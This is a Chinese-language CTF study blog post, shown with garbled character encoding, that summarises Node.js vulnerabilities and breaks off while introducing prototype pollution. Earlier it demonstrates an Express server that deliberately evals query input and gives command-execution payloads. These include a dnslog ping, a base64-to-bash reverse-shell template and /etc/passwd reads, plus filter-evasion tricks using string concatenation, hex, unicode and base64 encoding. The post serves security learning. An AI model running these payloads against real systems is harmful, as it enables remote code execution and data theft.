<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>Nodejsæ¼æ´æ€»ç»“ | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">é‚£å°±ç¥æˆ‘ä»¬æœ‰è®²ä¸å®Œçš„ç¬‘è¯å’Œæ•°ä¸å°½çš„æµªæ¼«</p><div class="m-nav"><ul><li><span class="dot">â—</span><a href="/archives/">å½’æ¡£</a></li><li><span class="dot">â—</span><a href="/categories/">åˆ†ç±»</a></li><li><span class="dot">â—</span><a href="/tags/">æ ‡ç­¾</a></li><li><span class="dot">â—</span><a href="/about/">å…³äº</a></li><li><span class="dot">â—</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="æœç´¢" onfocus="if(this.value=='æœç´¢'){this.value='';}" onblur="if(this.value==''){this.value='æœç´¢';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">Nodejsæ¼æ´æ€»ç»“</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">2022-11-20</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">å¸¸è§æ¼æ´å’Œæ‰‹æ³•</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h1 id="Nodejsè¯­è¨€ç‰¹æ€§"><a href="#Nodejsè¯­è¨€ç‰¹æ€§" class="headerlink" title="Nodejsè¯­è¨€ç‰¹æ€§"></a>Nodejsè¯­è¨€ç‰¹æ€§</h1><h2 id="å¤§å°å†™ç‰¹æ€§"><a href="#å¤§å°å†™ç‰¹æ€§" class="headerlink" title="å¤§å°å†™ç‰¹æ€§"></a>å¤§å°å†™ç‰¹æ€§</h2><pre><code class="plsql">toUpperCase()
toLowerCase()
</code></pre>
<p> å¯¹äºtoUpperCase(): å­—ç¬¦â€Ä±â€ã€â€Å¿â€ ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º â€œIâ€ã€â€Sâ€<br>å¯¹äºtoLowerCase(): å­—ç¬¦â€Kâ€ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸ºâ€kâ€(è¿™ä¸ªKä¸æ˜¯K)  </p>
<h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><h3 id="å¤§å°æ¯”è¾ƒ"><a href="#å¤§å°æ¯”è¾ƒ" class="headerlink" title="å¤§å°æ¯”è¾ƒ"></a>å¤§å°æ¯”è¾ƒ</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true 
console.log(1&gt;&#39;2&#39;); //false 
console.log(&#39;1&#39;&lt;&#39;2&#39;); //true 
console.log(111&gt;&#39;3&#39;); //true 
console.log(&#39;111&#39;&gt;&#39;3&#39;); //false 
console.log(&#39;asd&#39;&gt;1); //false
</code></pre>
<p> æ€»ç»“ï¼šæ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼›è€Œå­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤å°±ä¼šå‡ºç°ç¬¬äº”è¡Œä»£ç çš„è¿™ç§æƒ…å†µï¼›è€Œéæ•°å­—å‹å­—ç¬¦ä¸²ä¸ä»»ä½•æ•°å­—è¿›è¡Œæ¯”è¾ƒéƒ½æ˜¯false  </p>
<h3 id="æ•°ç»„æ¯”è¾ƒ"><a href="#æ•°ç»„æ¯”è¾ƒ" class="headerlink" title="æ•°ç»„æ¯”è¾ƒ"></a>æ•°ç»„æ¯”è¾ƒ</h3><pre><code class="plsql">console.log([]==[]); //false 
console.log([]&gt;[]); //false
console.log([6,2]&gt;[5]); //true 
console.log([100,2]&lt;&#39;test&#39;); //true 
console.log([1,2]&lt;&#39;2&#39;);  //true 
console.log([11,16]&lt;&quot;10&quot;); //false
</code></pre>
<p> æ€»ç»“ï¼šç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalseï¼Œæ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„é—´çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨å‰é¢æ€»ç»“çš„æ¯”è¾ƒæ–¹æ³•ï¼Œæ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸²ï¼›æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ  </p>
<h3 id="è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š"><a href="#è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š" class="headerlink" title="è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š"></a>è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š</h3><pre><code class="plsql">console.log(null==undefined) // è¾“å‡ºï¼štrue 
console.log(null===undefined) // è¾“å‡ºï¼šfalse 
console.log(NaN==NaN)  // è¾“å‡ºï¼šfalse 
console.log(NaN===NaN)  // è¾“å‡ºï¼šfalse
</code></pre>
<h2 id="å˜é‡æ‹¼æ¥ï¼š"><a href="#å˜é‡æ‹¼æ¥ï¼š" class="headerlink" title="å˜é‡æ‹¼æ¥ï¼š"></a>å˜é‡æ‹¼æ¥ï¼š</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6
console.log(&quot;5&quot;+6); //56 
console.log(&quot;5&quot;+[6,6]); //56,6 
console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6
</code></pre>
<h2 id="MD5çš„ç»•è¿‡"><a href="#MD5çš„ç»•è¿‡" class="headerlink" title="MD5çš„ç»•è¿‡"></a>MD5çš„ç»•è¿‡</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)
</code></pre>
<p>a[x]=1&amp;b[x]=2<br>æ•°ç»„ä¼šè¢«è§£ææˆ**[object Object]      **</p>
<pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;
b=&#123;&#39;x&#39;:&#39;2&#39;&#125;
 
console.log(a+&quot;flag&#123;xxx&#125;&quot;)
console.log(b+&quot;flag&#123;xxx&#125;&quot;)
 
a=[1]
b=[2]
 
console.log(a+&quot;flag&#123;xxx&#125;&quot;)
console.log(b+&quot;flag&#123;xxx&#125;&quot;)
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p>
<h2 id="ES6æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#ES6æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="ES6æ¨¡æ¿å­—ç¬¦ä¸²"></a>ES6æ¨¡æ¿å­—ç¬¦ä¸²</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå¼•å·æ›¿ä»£æ‹¬å·æ‰§è¡Œå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ›¿ä»£å•å¼•å·åŒå¼•å·ï¼Œå¯ä»¥åœ¨åå¼•å·å†…æ’å…¥å˜é‡ã€‚<br>ä½†æ˜¯æœ‰ä¸€ç‚¹æˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œæ¨¡æ¿å­—ç¬¦ä¸²æ˜¯å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°ä¸­ï¼Œè€Œå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æ•°ç»„é‡åˆ°${}æ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè¢«åˆ†å‰²ã€‚</p>
<pre><code class="plsql">var yake = &quot;sakura&quot;;
console.log(&quot;hello %s&quot;,yake);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p>
<pre><code class="plsql">var yake = &quot;sakura&quot;;
console.log`hello$&#123;yake&#125;world`;
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p>
<h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><h3 id="16è¿›åˆ¶ç¼–ç "><a href="#16è¿›åˆ¶ç¼–ç " class="headerlink" title="16è¿›åˆ¶ç¼–ç "></a>16è¿›åˆ¶ç¼–ç </h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true
</code></pre>
<h3 id="unicodeç¼–ç "><a href="#unicodeç¼–ç " class="headerlink" title="unicodeç¼–ç "></a>unicodeç¼–ç </h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true
</code></pre>
<h3 id="baseç¼–ç "><a href="#baseç¼–ç " class="headerlink" title="baseç¼–ç "></a>baseç¼–ç </h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())
</code></pre>
<h1 id="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"><a href="#Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"></a>Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨</h1><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript çš„ eval ä½œç”¨å°±æ˜¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„ js ä»£ç ã€‚  </p>
<pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //æ‰§è¡Œdocument.cookie
console.log(&quot;document.cookie&quot;); //è¾“å‡ºdocument.cookie
</code></pre>
<p><strong>æˆ‘ä»¬æ¥æ­å»ºä¸€ä¸ªæœåŠ¡æµ‹è¯•ä¸€ä¸‹</strong></p>
<pre><code class="plsql">var express = require(&quot;express&quot;);
var app = express();

app.get(&#39;/&#39;,function(req,res)&#123;
    res.send(eval(req.query.a));
console.log(req.query.a);
&#125;)

app.listen(1234);
console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);
</code></pre>
<p> Node.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br><strong>1.exec()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸spawn()ä¸åŒçš„æ˜¯å…¶æ¥å£ä¸åŒï¼Œå®ƒæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°è·çŸ¥å­è¿›ç¨‹çš„çŠ¶å†µã€‚å®é™…ä½¿ç”¨å¯ä»¥ä¸åŠ å›è°ƒå‡½æ•°ã€‚  </p>
<pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);
</code></pre>
<pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>æˆ‘ä»¬å¯ä»¥è¿›è¡Œåå¼¹shellçš„æ“ä½œ:</strong></p>
<pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);

æ³¨æ„ï¼šBASE64åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹)
</code></pre>
<p>PSï¼šå¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require(ç±»ä¼¼äºCode-Breaking 2018 Thejs)ï¼Œ<br>åˆ™å¯ä»¥ä½¿ç”¨global.process.mainModule.constructor._load(â€˜child_processâ€™).exec(â€˜calcâ€™)æ¥æ‰§è¡Œå‘½ä»¤</p>
<p><strong>2.spawn()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ã€‚spawn (å‘½ä»¤ï¼Œ{shell:true})ã€‚éœ€è¦å¼€å¯å‘½ä»¤æ‰§è¡Œçš„æŒ‡ä»¤ã€‚  </p>
<pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> ä¸spawn()ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºå®ƒåˆ›å»ºNodeçš„å­è¿›ç¨‹åªéœ€æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptæ–‡ä»¶æ¨¡å—å³å¯ã€‚ç”¨äºæ‰§è¡Œ js æ–‡ä»¶ï¼Œå®é™…åˆ©ç”¨ä¸­éœ€è¦æå‰å†™å…¥æ¶æ„æ–‡ä»¶  </p>
<pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);
</code></pre>
<p>æ­¤æ—¶æ˜¯å‡è®¾æˆ‘ä»¬å·²ç»ä¸Šä¼ äº†evil.jsæ–‡åŒ–,æˆ‘ä»¬å°±å¯ä»¥ç”¨forkå»æ‰§è¡Œ<br>å¦‚æˆ‘ä»¬åœ¨evil.jsä¸­ä»£ç å¦‚ä¸‹:</p>
<pre><code class="plsql">console.log(&quot;hello hacker&quot;);
</code></pre>
<p>æˆ‘ä»¬æ­¤æ—¶è®¿é—®è¿™ä¸ªç½‘ç«™</p>
<pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);
</code></pre>
<p>å¦‚å›¾ï¼Œå‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œäº†<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®é™…åˆ©ç”¨æ—¶ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä½ç½®æ‰§è¡Œ shell å‘½ä»¤ï¼Œç±»ä¼¼ execã€‚  </p>
<pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>æ³¨æ„ç‚¹:</strong></p>
<ol>
<li>**<em>spawn()ä¸exec()ã€execFile()ä¸åŒçš„æ˜¯ï¼Œåä¸¤è€…åˆ›å»ºæ—¶å¯ä»¥æŒ‡å®štimeoutå±æ€§</em>**ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œ ä¸€æ—¦åˆ›å»ºçš„è¿›ç¨‹è¿è¡Œè¶…è¿‡è®¾å®šçš„æ—¶é—´å°†ä¼šè¢«æ€æ­»ã€‚</li>
<li>exec()ä¸execFile()ä¸åŒçš„æ˜¯ï¼Œ**<em>exec()é€‚åˆæ‰§è¡Œå·²æœ‰çš„å‘½ä»¤ï¼ŒexecFile()é€‚åˆæ‰§è¡Œæ–‡ä»¶</em>**ã€‚</li>
</ol>
<p><strong>åé¢å‡ ä¸ªå‡½æ•°çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯è°ƒç”¨ä¸Šè¿°ä»‹ç»çš„å››ç§æ–¹æ³•,è¿™é‡Œå°±ä¸å†èµ˜è¿°!</strong></p>
<h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)ï¼Œè¯¥å‡½æ•°ä½œç”¨æ˜¯ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼Œfunction å¤„ä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ã€‚  </p>
<pre><code class="plsql">var express = require(&quot;express&quot;);
var app = express();

setTimeout(()=&gt;&#123;
  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);
&#125;,2000);

var server = app.listen(1234,function()&#123;
    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);
&#125;)
</code></pre>
<h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯æ¯ä¸ªä¸¤ç§’æ‰§è¡Œä¸€æ¬¡ä»£ç ã€‚  </p>
<pre><code class="plsql">var express = require(&quot;express&quot;);
var app = express();

setInterval(()=&gt;&#123;
  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);
&#125;,2000);


var server = app.listen(1234,function()&#123;
    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);
&#125;)
</code></pre>
<h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()ï¼Œstring æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œè¿™é‡Œçš„ function ç”¨æ³•ç±»ä¼¼äº php é‡Œçš„ create_functionã€‚  </p>
<pre><code class="plsql">var express = require(&quot;express&quot;);
var app = express();

var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();

var server = app.listen(1234,function()&#123;
    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);
&#125;)
</code></pre>
<h2 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h2><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œé‚£è‡ªç„¶å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„å¢åˆ æ”¹æŸ¥ã€‚<br>æ“ä½œå‡½æ•°åé¢æœ‰Syncä»£è¡¨åŒæ­¥æ–¹æ³•</p>
<blockquote>
<p>Node.js æ–‡ä»¶ç³»ç»Ÿï¼ˆfs æ¨¡å—ï¼‰æ¨¡å—ä¸­çš„æ–¹æ³•å‡æœ‰å¼‚æ­¥å’ŒåŒæ­¥ç‰ˆæœ¬ï¼Œä¾‹å¦‚è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°æœ‰å¼‚æ­¥çš„ fs.readFile() å’ŒåŒæ­¥çš„ fs.readFileSync()ã€‚<br>å¼‚æ­¥çš„æ–¹æ³•å‡½æ•°æœ€åä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œå›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«äº†é”™è¯¯ä¿¡æ¯(error)ã€‚<br>å»ºè®®å¤§å®¶ä½¿ç”¨å¼‚æ­¥æ–¹æ³•ï¼Œæ¯”èµ·åŒæ­¥ï¼Œå¼‚æ­¥æ–¹æ³•æ€§èƒ½æ›´é«˜ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”æ²¡æœ‰é˜»å¡ã€‚</p>
</blockquote>
<p><strong>è¯»</strong><br>readFile()</p>
<pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123;
 if (err) throw err;
 console.log(data);
&#125;);
</code></pre>
<p> readFileSync()</p>
<pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)
</code></pre>
<p>readdirSync</p>
<pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()
</code></pre>
<p>rmdirSync</p>
<pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()
</code></pre>
<p><strong>å†™</strong><br> writeFileSync()</p>
<pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);
</code></pre>
<p> writeFile()</p>
<pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)
</code></pre>
<h2 id="nodejså±é™©å‡½æ•°-RCE-bypass"><a href="#nodejså±é™©å‡½æ•°-RCE-bypass" class="headerlink" title="nodejså±é™©å‡½æ•°-RCE bypass"></a>nodejså±é™©å‡½æ•°-RCE bypass</h2><p> åŸå‹:</p>
<pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)
</code></pre>
<h3 id="å­—ç¬¦æ‹¼æ¥"><a href="#å­—ç¬¦æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æ‹¼æ¥"></a>å­—ç¬¦æ‹¼æ¥</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)
//(%2bå°±æ˜¯+çš„urlç¼–ç )
 
require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)
</code></pre>
<h3 id="ç¼–ç ç»•è¿‡-1"><a href="#ç¼–ç ç»•è¿‡-1" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)
require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)
eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //å¼¹è®¡ç®—å™¨
</code></pre>
<h3 id="æ¨¡æ¿æ‹¼æ¥"><a href="#æ¨¡æ¿æ‹¼æ¥" class="headerlink" title="æ¨¡æ¿æ‹¼æ¥"></a>æ¨¡æ¿æ‹¼æ¥</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;ï¼‰
</code></pre>
<h3 id="å…¶ä»–å‡½æ•°"><a href="#å…¶ä»–å‡½æ•°" class="headerlink" title="å…¶ä»–å‡½æ•°"></a>å…¶ä»–å‡½æ•°</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); 
require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); 
require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* 
require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); 
require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); 
require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);
</code></pre>
<h1 id="nodejs-åŸå‹é“¾æ±¡æŸ“"><a href="#nodejs-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="nodejs-åŸå‹é“¾æ±¡æŸ“"></a>nodejs-åŸå‹é“¾æ±¡æŸ“</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“è¿™å‡ ç‚¹:<br> 1.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚  </p>
<pre><code class="plsql">object.prototype.name=value
</code></pre>
<p> 2.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š  </p>
<pre><code class="html">objectname[&quot;__proto__&quot;]
objectname.__proto__
objectname.constructor.prototype
</code></pre>
<p> 3.ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š  </p>
